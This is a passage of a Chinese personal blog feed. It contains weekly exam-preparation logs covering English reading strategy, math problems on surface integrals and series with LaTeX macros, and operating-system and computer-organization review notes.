&lt;p&gt;现在是2019年5月6日，距离2020考研还有&lt;strong&gt;&lt;font color=&quot;red&quot;&gt;230&lt;/font&gt;&lt;/strong&gt;天。这是Log的第四周，长达五天小长假的五一节已经过去了，五一基本上是这个学期最长的假期了，在此之后基本上就要迎接期末的到来了。这个假期总的来说不是那么尽如人意，在英语方面花了大量的时间，尤其是在单词（《恋练有词》）上的学习，以致于这周都没时间放在408上。之后通过知乎了解到前学长学姐对韦林课程的负面评价之后，心中有了些许小小的波动。可见：&lt;a href=&quot;https://www.zhihu.com/question/306959786/answer/559746952&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;如何评价朱伟以及他的韦林？&lt;/a&gt;。自身在逐渐学习2019年版《恋练有词》这门课程时，也和大多数知乎上的答主感同身受，所以后期的打算是《恋练有词》会继续跟下去，但是可能会进一步加快进度，否则没有太多时间留给数学和专业课。&lt;/p&gt;
&lt;p&gt;当然，上帝为你关上一扇门的同时也会为你打开一扇窗。虽然在单词上面不是很满意，但是在英语阅读理解上面却自我感觉有了不小的提高，这进一步增强了对英语的信心。以前的自己在做阅读理解的过程中总是会有文章逻辑理不清、长难句读不懂、二选一完美避开正确选项等问题，对待阅读常常会有一种恐惧心理。但现在对待阅读理解的态度的确有了一个较大的逆转，会以一种积极向上的态度去学习，甚至发现阅读理解也有其中的乐趣可言，而并非想象中的那么枯燥乏味。在这段阅读理解的学习过程中，也总结出了适合自己的做题方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先快速阅读五道题，明白题目问的是什么，然后尝试着得到本篇文章中心论点（关键词），时间允许的话快速扫描一下选项，观察是否存在共同点&lt;/li&gt;
&lt;li&gt;带着题干中总结出的关键词快速阅读全文中每个段落的首尾句，然后尽力理清作者的写作思路以及态度，得到全文的中心论据（主要是讲的一个什么东西），并且对文章的结构加以短暂的分析，比如说：全文是总分的形式还是总分总，首段是不是按照以例子来引出中心论据的套路等&lt;/li&gt;
&lt;li&gt;在以上两步完成的情况下，接着就是剑鞘直击题目了，通过常用的定位方法以及前两步骤对文章的了解应该可以快速在文章中得到对应题目的定位了。&lt;/li&gt;
&lt;li&gt;定位好之后就是逐个比较，如果确定了那就一锤定音直击正确选项，如果不确定就需要回到原文不断的比较排除，最终根据自认为可信度最高的选项走。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然，我也明白：方法是死的人是活的，在确定了适合自己方法之后，还是需要一定的题量支持，不断的去强化自己并加以总结以完善自己的做题方式，朝着更高的正确率前进。&lt;/p&gt;
    
    </summary>
    
      <category term="随写" scheme="https://muzimz.cn/categories/%E9%9A%8F%E5%86%99/"/>
    
    
      <category term="随写" scheme="https://muzimz.cn/tags/%E9%9A%8F%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>随写录3（4.22-4.28）</title>
    <link href="https://muzimz.cn/2019/04/29/%E9%9A%8F%E5%86%99%E5%BD%953%EF%BC%884.22-4.28%EF%BC%89/"/>
    <id>https://muzimz.cn/2019/04/29/随写录3（4.22-4.28）/</id>
    <published>2019-04-29T15:29:11.000Z</published>
    <updated>2020-02-21T02:20:32.616Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="orange">总有一天你将破蛹而出，成长得比热门期待的还要美丽。</font><font color="orange">但这个过程会很痛，会很辛苦，有时候还会觉得灰心。</font><font color="orange">面对着汹涌而来的现实，觉得自己渺小无力。</font><font color="orange">但这，也是生命的一部分。做好现在你能做的，然后，一切都会好的。</font><font color="orange">我们都将孤独的长大，不要害怕。</font><font color="orange"><div style="text-align: right">—— 寂地 《踮脚张望的时光》</div></font></blockquote><p>现在是2019年4月29日，距离2020考研还有<strong><font color="red">237</font></strong>天。这是Log的第三周，上周学校举行了运动会，所以除了周末之外，多放了一天假 ┗|｀O′|┛ 嗷~~，所以复习的进度稍微推进了一点。不过很遗憾，和往年一样，这次的运动会我并没有参加任何的项目，但同时这也警醒了我，在复习期间需要一定运动的支持，才能进一步提高复习的效率，毕竟毛泽东同志说过：“身体的革命的本钱“。所以，在后期复习期间会添加一个晨跑的环节，时间定在<code>5:50am - 6:20am</code>，没有特殊情况下希望自己能说到做到，不要给懒惰滋生的机会。另外，后天就是五一劳动节了，总共会有五天的小长假，意味着这周基本上都是在五一中度过了，这么长的假期相当来之不易，所以需要好好规划下这周的任务。</p><h2 id="Log内容"><a href="#Log内容" class="headerlink" title="Log内容"></a>Log内容</h2><ul><li>本周复习状况</li><li>下周复习计划</li></ul><a id="more"></a><h2 id="本周复习状况"><a href="#本周复习状况" class="headerlink" title="本周复习状况"></a>本周复习状况</h2><p>本周在网上购买了不少现在以及后期需要使用到的书，主要有如下：</p><ul><li>《阅读的逻辑》    唐迟    江西美术出版社</li><li>《恋练有词》      朱伟、唐迟  群言出版社</li><li>《长难句解析》何凯文  中国原子能出版社</li><li>《英语历年真题全解》点知命题组    电子科技大学</li><li>《2020高分写作》  王江涛  群言出版社</li><li>《复习全书、660题、真题》 李永乐、王式安、武忠祥  国家行政学院出版社</li><li>《2020李林精讲精练880题 数学一》李林  中国人民大学出版社 </li><li>《2020李林冲刺六套卷、终极预测四套卷》  李林  国家开放大学出版社</li><li>《2020汤家凤1800题》  汤家凤 中国原子能出版社</li></ul><p>其中《2020李林精讲精练880题数学一》和《2020李林冲刺六套卷、终极预测四套卷》是属于预售书，需要到两个月左右才能发货，预售比较便宜所以就先买了；《2020汤家凤1800题》这本书还在运输过程中，预计明天到达。</p><p><img src="https://i.loli.net/2019/05/01/5cc97dee55bf8.png" width="500"></p><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>英语方面，现在除了纯背单词之外，每天还在跟着朱伟视频学习恋练有词，感觉现在准备练练有词太花时间了，没课的情况下（周末）每天基本上要花费近五个小时。之后也在知乎、贴吧上找了上岸的学长学姐的经验，结果是褒贬不一。不管怎么样，既然《恋练有词》这门课程已经开始了，还是打算看完跟着视频走下去、尽量做到物有所值，把该做的笔记都做上，目前的目标是暑假前将视频学习完，并且自行重新梳理一遍。</p><h4 id="周周长难句："><a href="#周周长难句：" class="headerlink" title="周周长难句："></a>周周长难句：</h4><blockquote><p>Rosenberg argues convinvcingly that public-health advocates ought to take a page from advertisers, so skilled at applying peer pressure.<br>罗森伯格的观点颇具说服力：公共健康倡导者应向广告商学习，因他们擅长运用同辈压力。</p></blockquote><font color="red">① 主干：主谓宾 | that 为宾语从句 | 注意ought to整体作情态动词 相当于should</font> <font color="green">② 修饰：形容词skilled作定语 解释advertisers</font><font color="orange">③ 改写：adverstisers who are so skilled at</font><p>重要单词：<br>convincing： 令人信服的<br>advocate： 提倡、拥护、提倡者<br>take a page from： 向…学习<br>employ、exploit、deploy、exert、utilize、apply：应用</p><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><blockquote><p>计算曲面积分</p><script type="math/tex; mode=display">\ooint_E\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\frac{3}{2}}}</script><p>其中$E$是曲面 $2x^2+2 y^2+z^2=4$ 的外侧。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 批注PS:</span></span><br><span class="line"><span class="comment"># 这里有个技巧需要记录一下，在使用Latex的过程中，是没有直接给出二类曲面积分的书写的</span></span><br><span class="line"><span class="comment"># 所以，我们需要自行定义，定义之后直接使用即可，其中定义方式如下：</span></span><br><span class="line"></span><br><span class="line">\def\ooint&#123;&#123;\bigcirc&#125;\kern-11.5pt&#123;\int&#125;\kern-6.5pt&#123;\int&#125;&#125;</span><br><span class="line">\def\oooint&#123;&#123;\bigcirc&#125;\kern-12.3pt&#123;\int&#125;\kern-7pt&#123;\int&#125;\kern-7pt&#123;\int&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方式如下：</span></span><br><span class="line"></span><br><span class="line">I= \def\ooint&#123;&#123;\bigcirc&#125;\kern-11.5pt&#123;\int&#125;\kern-6.5pt&#123;\int&#125;&#125;</span><br><span class="line">\def\oooint&#123;&#123;\bigcirc&#125;\kern-12.3pt&#123;\int&#125;\kern-7pt&#123;\int&#125;\kern-7pt&#123;\int&#125;&#125;</span><br><span class="line">\ooint_E\frac&#123;xdydz+ydzdx+zdxdy&#125;&#123;x^<span class="number">2</span>+y^<span class="number">2</span>+z^<span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如此使用之后即可渲染出上式。</span></span><br></pre></td></tr></table></figure><p>这是2009年的数学一的一道真题，总体思路与常无异，但这里有个地方值得注意。使用高斯公式之后将曲面积分转化为三重积分之后，我们可以发现圆点在积分区域之内，然而在等式原曲面积分中圆点是一个特殊点，所以在这需要将圆点单独考虑。即构造一个小球面 $E_1=x^2+y^2+z^2=\varepsilon^2 (\varepsilon \to 0)$，取其内侧。之后我们即可将构造好的积分区域作为新的区域，且构造的原因就是将圆点的特殊情况排除在外，将新的区域减去 $E_1$ 区域即可求得原第二类曲面积分值，解法如下：</p><script type="math/tex; mode=display">\ooint_E\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\frac{3}{2}}}=\ooint_{E+E_1}\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\frac{3}{2}}}-\ooint_{E_1}\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\frac{3}{2}}}</script><script type="math/tex; mode=display">\begin{align}        I_1& = \ooint_{E_1}\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\frac{3}{2}}} \\& = \frac{1}{\varepsilon^3}\ooint_{E_1}xdxdz+ydzdx+zdxdy  \\&=-\frac{1}{\varepsilon^3}\iiint_{\Omega_1}3dxdydz  \\&=-\frac{3}{\varepsilon^3}\frac{4\pi\varepsilon^3}{3}=-4\pi    \end{align}</script><script type="math/tex; mode=display">    \begin{align}        I_2& = \ooint_{E+E_1}\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\frac{3}{2}}} \\& = \iiint_{\Omega}[\frac{\partial}{\partial x}(\frac{x}{(x^2+y^2+z^2)^\frac{3}{2}})+\frac{\partial}{\partial x}(\frac{y}{(x^2+y^2+z^2)^\frac{3}{2}})+\frac{\partial}{\partial x}(\frac{z}{(x^2+y^2+z^2)^\frac{3}{2}})]dxdydz  \\&=\iiint_\Omega 0 dxdydz=0    \end{align}</script><script type="math/tex; mode=display">I=I_2-I_1=4\pi</script><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Latex源码</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">def</span></span><span class="tag">\<span class="name">ooint</span><span class="string">&#123;&#123;\bigcirc&#125;</span></span><span class="tag">\<span class="name">kern</span></span>-11.5pt&#123;<span class="tag">\<span class="name">int</span></span>&#125;<span class="tag">\<span class="name">kern</span></span>-6.5pt&#123;<span class="tag">\<span class="name">int</span></span>&#125;&#125;</span><br><span class="line"><span class="tag">\<span class="name">def</span></span><span class="tag">\<span class="name">oooint</span><span class="string">&#123;&#123;\bigcirc&#125;</span></span><span class="tag">\<span class="name">kern</span></span>-12.3pt&#123;<span class="tag">\<span class="name">int</span></span>&#125;<span class="tag">\<span class="name">kern</span></span>-7pt&#123;<span class="tag">\<span class="name">int</span></span>&#125;<span class="tag">\<span class="name">kern</span></span>-7pt&#123;<span class="tag">\<span class="name">int</span></span>&#125;&#125;</span><br><span class="line"><span class="tag">\<span class="name">ooint</span></span>_E<span class="tag">\<span class="name">frac</span><span class="string">&#123;xdydz+ydzdx+zdxdy&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^&#123;\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;&#125;=<span class="tag">\<span class="name">ooint</span></span>_&#123;E+E_1&#125;<span class="tag">\<span class="name">frac</span><span class="string">&#123;xdydz+ydzdx+zdxdy&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^&#123;\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;&#125;-<span class="tag">\<span class="name">ooint</span></span>_&#123;E_1&#125;<span class="tag">\<span class="name">frac</span><span class="string">&#123;xdydz+ydzdx+zdxdy&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^&#123;\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line">        I_1</span><br><span class="line">&amp; = <span class="tag">\<span class="name">ooint</span></span>_&#123;E_1&#125;<span class="tag">\<span class="name">frac</span><span class="string">&#123;xdydz+ydzdx+zdxdy&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^&#123;\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;&#125; <span class="tag">\<span class="name">\</span></span></span><br><span class="line">&amp; = <span class="tag">\<span class="name">frac</span><span class="string">&#123;1&#125;</span><span class="string">&#123;\varepsilon^3&#125;</span></span><span class="tag">\<span class="name">ooint</span></span>_&#123;E_1&#125;xdxdz+ydzdx+zdxdy  <span class="tag">\<span class="name">\</span></span></span><br><span class="line">&amp;=-<span class="tag">\<span class="name">frac</span><span class="string">&#123;1&#125;</span><span class="string">&#123;\varepsilon^3&#125;</span></span><span class="tag">\<span class="name">iiint</span></span>_&#123;<span class="tag">\<span class="name">Omega</span></span>_1&#125;3dxdydz  <span class="tag">\<span class="name">\</span></span></span><br><span class="line">&amp;=-<span class="tag">\<span class="name">frac</span><span class="string">&#123;3&#125;</span><span class="string">&#123;\varepsilon^3&#125;</span></span><span class="tag">\<span class="name">frac</span><span class="string">&#123;4\pi\varepsilon^3&#125;</span><span class="string">&#123;3&#125;</span>=<span class="number">-4</span></span><span class="tag">\<span class="name">pi</span></span></span><br><span class="line">    <span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line">    </span><br><span class="line">        <span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line">        I_2</span><br><span class="line">&amp; = <span class="tag">\<span class="name">ooint</span></span>_&#123;E+E_1&#125;<span class="tag">\<span class="name">frac</span><span class="string">&#123;xdydz+ydzdx+zdxdy&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^&#123;\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;&#125; <span class="tag">\<span class="name">\</span></span></span><br><span class="line">&amp; = <span class="tag">\<span class="name">iiint</span></span>_&#123;<span class="tag">\<span class="name">Omega</span></span>&#125;[<span class="tag">\<span class="name">frac</span><span class="string">&#123;\partial&#125;</span><span class="string">&#123;\partial x&#125;</span></span>(<span class="tag">\<span class="name">frac</span><span class="string">&#123;x&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;)+<span class="tag">\<span class="name">frac</span><span class="string">&#123;\partial&#125;</span><span class="string">&#123;\partial x&#125;</span></span>(<span class="tag">\<span class="name">frac</span><span class="string">&#123;y&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;)+<span class="tag">\<span class="name">frac</span><span class="string">&#123;\partial&#125;</span><span class="string">&#123;\partial x&#125;</span></span>(<span class="tag">\<span class="name">frac</span><span class="string">&#123;z&#125;</span><span class="string">&#123;(x^2+y^2+z^2)^\frac&#123;3&#125;</span><span class="string">&#123;2&#125;</span></span>&#125;)]dxdydz  <span class="tag">\<span class="name">\</span></span></span><br><span class="line">&amp;=<span class="tag">\<span class="name">iiint</span></span>_<span class="tag">\<span class="name">Omega</span></span> 0 dxdydz=0</span><br><span class="line">    <span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span></span><br><span class="line">    </span><br><span class="line">I=I_2-I_1=4<span class="tag">\<span class="name">pi</span></span></span><br></pre></td></tr></table></figure><h3 id="408"><a href="#408" class="headerlink" title="408"></a>408</h3><ul><li>并发是指两个或多个时间在<font color="red">同一时间间隔内</font>发生，而并行是指在<font color="red">同一时刻</font>，这一点需要格外注意。</li><li>命令接口主要有联机命令接口（交互式命令接口）和脱机命令接口（批处理命令接口），其中联机特点是执行一条命令汇报一条，而脱机是直接全部执行。另外，批处理无法进行人机交互。</li><li>程序接口由一组系统调用命令组成，简称<font color="red">系统调用</font>，需要注意它的其他别名：<font color="red">广义指令</font></li><li>特权指令是指不允许用户直接使用的指令，以下几个需要强烈记忆：<font color="red">I/O指令、置中断指令、保护内存的寄存器、送程序状态字的指令</font>。</li><li>防管指令（trap指令、陷入指令）只在用户态下<font color="red">使用</font>，而执行防管指令则将会由用户态向核心态转换。所以说用户态下可以发生系统调用但是不能执行系统调用，且核心态下CPU可以执行除防管指令之外的全部指令</li><li><font color="red">进程的调度是由操作系统完成，不需要硬件的支持，用户态到核心态的转化需要硬件的支持</font></li><li>进程进程实体（进程映像）的运行过程，是系统进行资源分配和调度的一个独立单位。其中，进程与进程映像（进程实体、程序）的根本区别是<font color="red">进程是动态的，而其他是静态的</font>。</li><li>进程中，运行态 -&gt; 阻塞态（等待态）是主动的，阻塞态 -&gt; 就绪态是被动的，需要其他进程的协助</li><li>进程的创建过程：<font color="red">①申请PCB ②分配资源（内存）③初始化PCB ④进入就绪队列，等待CPU执行。一般来讲先有资源的调度，再有进程的切换</font></li><li><p>多个进程可以运行同一个程序</p><blockquote><ol><li>同一个程序经过多次创建，运行在不同的数据集上，形成了（<font color="red">A</font>）的进程<br>A：不同 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;B：相同&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C：同步&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D：互斥<font color="orange">PS：运行在不同的数据集，将会形成不同的进程</font></li><li>系统动态DLL库中的系统线程，被不同的进程所调用，它们是（<font color="red">B</font>）的线程<br>A：不同&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; B：相同 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C：可能不同，也可能相同&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D：不能被调用<font color="orange">PS：程序代码经过多次创建可以对应不同的进程，而同一个系统的进程可以由系统调用的方法被不同的进程使用</font></li></ol></blockquote></li><li><p>引入线程之后，进程是除CPU外的系统资源的分配单位，而线程是处理机（CPU）的分配单位。线程可以分为用户级线程和内核级线程，且<font color="red">只有内核级线程</font>才是处理机分配的单位</p></li><li>临界区是<font color="red">访问临界资源的那段代码</font>，而<font color="red">临界资源是一个时间段内只允许一个进程使用的资源（需要互斥访问）</font></li><li>调度评价准则：<br>① CPU利用率<script type="math/tex; mode=display">\eta=\frac{T_{忙}}{T_{总}}，T_{总}=T_{忙}+T_{I/O}</script>② 系统吞吐率<script type="math/tex; mode=display">\omega=\frac{总作业数}{总时间数}</script>③ 周转时间<script type="math/tex; mode=display">  周转时间=作业完成时间-作业提交时间</script>④ 带权周转时间<script type="math/tex; mode=display">带权周转时间=\frac{作业周转时间}{作业实际运行时间}=\frac{T_{周}}{T_{运}}</script>④ 等待时间<script type="math/tex; mode=display">等待时间=周转时间-运行时间-I/O操作时间</script>以上是进程调度的常用评价标准，理解性记忆就行了</li><li>进程调度算法……（<font color="red">注意英文简称</font>）<br>在<font color="red">优先级调度算法中（Priority Scheduleily）</font>中，需要注意常见的优先级关系<script type="math/tex; mode=display">  进程优先级       \begin{cases}          系统进程 > 用户进程\\          交互性进程 > 非交互性进程\\          I/O型进程 > 计算型进程（CPU）\\      \end{cases}</script>在<font color="red">高响应比有限调度算法（Hightest Response_ratio Next）</font>中，需要注意响应比的计算<script type="math/tex; mode=display">响应比=\frac{等待时间+要求服务时间}{要求服务时间}</script></li><li><font color="red">进程同步互斥章节中，需要尤其复习全面（很重要）</font></li><li>死锁是多个进程争夺资源而造成的一种僵局（互相等待），若无外力作用，这种局面将会一直保持下去。死锁处理主要有三个方面：<font color="red">死锁预防、死锁避免、死锁的检测和解除</font>。</li><li>死锁预防是破坏一个或几个死锁产生的必要条件，死锁避免是放置进入不安全的状态（银行家算法），死锁检测和解除可以允许死锁，死锁后检测并解除。</li></ul><h2 id="下周复习计划"><a href="#下周复习计划" class="headerlink" title="下周复习计划"></a>下周复习计划</h2><ul><li>英语词汇继续复习，并且适当的收集往年真题中的生词及词组，在词汇的学习中适当观看恋练有词的配套视频，继续坚持每天两篇阅读的进度</li><li>数学没什么好说的，基本适当刷题的状态</li><li>408下周继续复习《操作系统》，将剩下的三个章节复习完</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;orange&quot;&gt;总有一天你将破蛹而出，成长得比热门期待的还要美丽。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;但这个过程会很痛，会很辛苦，有时候还会觉得灰心。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;面对着汹涌而来的现实，觉得自己渺小无力。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;但这，也是生命的一部分。做好现在你能做的，然后，一切都会好的。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;我们都将孤独的长大，不要害怕。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;&lt;div style=&quot;text-align: right&quot;&gt;—— 寂地 《踮脚张望的时光》&lt;/div&gt;&lt;/font&gt;


&lt;/blockquote&gt;
&lt;p&gt;现在是2019年4月29日，距离2020考研还有&lt;strong&gt;&lt;font color=&quot;red&quot;&gt;237&lt;/font&gt;&lt;/strong&gt;天。这是Log的第三周，上周学校举行了运动会，所以除了周末之外，多放了一天假 ┗|｀O′|┛ 嗷~~，所以复习的进度稍微推进了一点。不过很遗憾，和往年一样，这次的运动会我并没有参加任何的项目，但同时这也警醒了我，在复习期间需要一定运动的支持，才能进一步提高复习的效率，毕竟毛泽东同志说过：“身体的革命的本钱“。所以，在后期复习期间会添加一个晨跑的环节，时间定在&lt;code&gt;5:50am - 6:20am&lt;/code&gt;，没有特殊情况下希望自己能说到做到，不要给懒惰滋生的机会。另外，后天就是五一劳动节了，总共会有五天的小长假，意味着这周基本上都是在五一中度过了，这么长的假期相当来之不易，所以需要好好规划下这周的任务。&lt;/p&gt;
&lt;h2 id=&quot;Log内容&quot;&gt;&lt;a href=&quot;#Log内容&quot; class=&quot;headerlink&quot; title=&quot;Log内容&quot;&gt;&lt;/a&gt;Log内容&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本周复习状况&lt;/li&gt;
&lt;li&gt;下周复习计划&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="随写" scheme="https://muzimz.cn/categories/%E9%9A%8F%E5%86%99/"/>
    
    
      <category term="随写" scheme="https://muzimz.cn/tags/%E9%9A%8F%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>随写录2（4.15-4.21）</title>
    <link href="https://muzimz.cn/2019/04/21/%E9%9A%8F%E5%86%99%E5%BD%952%EF%BC%884.15-4.21%EF%BC%89/"/>
    <id>https://muzimz.cn/2019/04/21/随写录2（4.15-4.21）/</id>
    <published>2019-04-21T13:33:23.000Z</published>
    <updated>2020-02-21T02:19:32.971Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="orange">志向是天才的幼苗，经过热爱劳动的双手培育，在肥田沃土里将成长为粗壮的大树。不热爱劳动，不进行自我教育，志向这棵幼苗也会连根枯死。确定个人志向，选好专业，这是幸福的源泉。</font><font color="orange"><div style="text-align: right">—— 苏霍姆林斯基</div></font></blockquote><p>现在是2019年4月22日，距离2020考研还有<strong><font color="red">244</font></strong>天。这是Log的第二周，和往常一样，过着三点一线的生活，只不过这周的食欲不是很好，什么都不太想吃。此外，最近最大的变化就是对时间越来越敏感了，眼睛一睁一闭，一天就过去了，时间溜得贼快，感觉一天下来还没完成多少任务就已经结束了。</p><h2 id="Log内容"><a href="#Log内容" class="headerlink" title="Log内容"></a>Log内容</h2><ul><li>本周复习状况</li><li>下周复习计划</li></ul><a id="more"></a><h2 id="本周复习状况"><a href="#本周复习状况" class="headerlink" title="本周复习状况"></a>本周复习状况</h2><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>英语词汇已经过了一遍，基本上是一种背了后面忘了前面的状态，真正记忆下来的单词感觉还是比较少的，使用的是大一的时候获得的一本单词书，唐叔说过：“对于那些没有单词功底的考生来说，阅读方法再好也都是浮云，最后的结果只有放弃或再战。”，所以说阅读的正确率是建立在方法、长难句分析和单词的基础之上的，三者缺一不可。虽然这本单词书在之前不知过了多少遍，后续还是需要市场拿出来不断的翻阅。</p><p><img src="https://i.loli.net/2019/05/01/5cc9779f7afd1.jpg" width="300"></p><h4 id="周周长难句："><a href="#周周长难句：" class="headerlink" title="周周长难句："></a>周周长难句：</h4><blockquote><p>Germany thinks the euro must be saved by stricter rules on borrow, spending and competitiveness, backed by quasi-automatic sanctions for governments that  do not obey.<br>德国认为：必须通过更严格的借贷、支出和竞争力条款来节省欧元，并辅以类似自动制裁的方式，以对付不遵守条款的政府。</p></blockquote><font color="red">① Germany thinks the euro must be saved by stricter rules</font> <font color="green">② on borrow, spending and competitiveness,</font><font color="orange">③ backed by quasi-automatic sanctions for governments that  do not obey.</font><p>①： 主干。被动语态<br>②： 修饰。介词短语on（关于）…作定语，解释rules<br>③： 修饰。过去分词backed…作定语，解释rules，即which are backed by（受到…的支持）</p><p>重要单词：<br>competitiveness 竞争力<br>back： 支持<br>quasi-： 准的，类似的<br>sanction：制裁</p><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><blockquote><p>Q1：$I=lim_{x \to 0}\frac{xsin^2x-2(1-cosx)sinx}{x^4}=$</p></blockquote><p>这道题虽然不难，但是我初次做这道题的时候，就直接在原式的基础来进行操作，从而导致最后的解答相对来说比较麻烦。其实这道题的正解是先把分子中的结合的式子进行拆开，然后借助泰勒的辅助。最后得出正解$0$，相比于上一周的极限题，这道题并不难，只是有个小技巧需要留意，所以就不在写出过程了。</p><p>总结：在实际刷数学题的过程中，不要着急的去求解，应当初步观察一下题所给出的原式，也许会有别样的收获。</p><blockquote><p>Q2：计算$\iint_{E} \frac{1}{\rho}dS，其中E为椭球面\frac{x^2}{a^2}+\frac{y^2}{b^2}+\frac{z^2}{a^2}=1，\rho为圆点到切平面的距离。$    </p></blockquote><p>分析：这道题主要考察的是曲面积分的计算以及考生的计算能力。其中这里有个小知识点需要注意，像这种曲面的式子，我们可以直接写出经过切点平面方程，而不需要花费时间去计算。在得到切平面的基础上，之后就是计算出 $\rho$ 的表达式，最后通过适当的代换求解出该曲面积分的值。</p><p><img src="https://i.loli.net/2019/05/01/5cc9779f57993.jpg" width="600"></p><blockquote><p>Q3：验证函数$y=1+\frac{x^3}{3!}+\frac{x^6}{6!}+\frac{x^9}{9!}+···+\frac{x^{3n}}{(3n)!}+···$满足$y^{‘’}+y^{‘}+y=e^x$</p></blockquote><p>分析：这主要是一道无穷级数的题，求解这道题的关键是熟练掌握常见函数的展开式，并且如何进行展开。初步分析，可以发现在$y^{‘’}+y^{‘}+y=e^x$式子中出现$e^x$的指数形式，所以我们可以初步选择指数的无穷展开。此外，观察函数 $y$，我们可以发现该式子是一个3的整数倍此方，并且$y^{‘’}和y^{‘}$的结果分别为2和1的整数倍，三者之和正好形成了指数的展开形式。到此，我们的基本上有了一个解题思路，过程如下：</p><p><img src="https://i.loli.net/2019/05/01/5cc9779f55fd0.jpg" width="600"></p><p>总结：能否正确解决这道题，主要还是要看自己的洞察能力，而洞察能力是通过不断的训练来进行提高的，所以在学习数学的过程中离不开大量题目的支持。</p><h3 id="408"><a href="#408" class="headerlink" title="408"></a>408</h3><p>按照上周的计划，这周如期复习完了计算机组成原理余下的内容，主要的章节是中央处理器、总线、输入/输出系统。下面记录本周408中琐碎且容易被忽略的小知识点：</p><ul><li>PC（程序计数器）中的内容是<font color="red">指令在主存中的地址</font>，所以它的位数主要取决于主存容量。IR（指令寄存器）位数主要取决于<font color="red">指令字长</font>。通用寄存器则与与机器字长相等。</li><li>条件转移指令执行时所依据的条件来自<font color="red">标志寄存器</font>，而<font color="red">非程序计数器</font>，因为转移指令执行的时候需要对标志寄存器的内容进行测试，看是否满足转移条件。</li></ul><blockquote><p>下面有关程序计数器（PC）的叙述中，错误的是（C）<br>A. PC总总是存放指令的地址<br>B. PC的值由CPU在执行指令的过程中进行修改<br>C. 转移指令时，PC的值总是修改为转移指令的目标地址<br>D. 